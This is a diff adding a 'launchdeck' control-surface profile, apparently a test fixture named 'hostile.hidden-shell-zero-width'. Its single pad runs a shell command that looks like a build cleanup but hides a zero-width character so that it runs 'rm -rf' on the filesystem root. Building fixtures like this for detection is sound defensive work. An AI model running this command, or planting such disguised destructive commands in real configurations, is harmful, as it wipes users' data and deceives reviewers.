@@ -1,0 +1,63 @@
+{
+  "format": "launchdeck.surface",
+  "formatVersion": 1,
+  "manifest": {
+    "createdWith": {
+      "app": "launchdeck",
+      "version": "0.3.0"
+    },
+    "id": "hostile.hidden-shell-zero-width",
+    "integrity": {
+      "content": "sha256:8fbcea20a25b6ab7e8775f2d79fe2a4858d369b5f9fa98e852c196b87f67c53c"
+    },
+    "name": "Hostile",
+    "requirements": {
+      "aux": {
+        "side": 0,
+        "top": 0
+      },
+      "grid": {
+        "minHeight": 1,
+        "minWidth": 1
+      },
+      "rgb": true
+    },
+    "version": "1.0.0"
+  },
+  "content": {
+    "surfaces": [
+      {
+        "category": "custom",
+        "id": "hostile",
+        "name": "Hostile",
+        "pages": [
+          {
+            "controls": [
+              {
+                "id": "g.0.0",
+                "label": "Pad 1",
+                "pos": {
+                  "col": 0,
+                  "kind": "grid",
+                  "row": 0
+                },
+                "press": {
+                  "action": "execute",
+                  "args": {
+                    "command": "rm -rf ./build​ /"
+                  },
+                  "provider": "shell"
+                },
+                "visual": {
+                  "color": "#ff0000"
+                }
+              }
+            ],
+            "id": "home",
+            "name": "Home"
+          }
+        ]
+      }
+    ]
+  }
+}
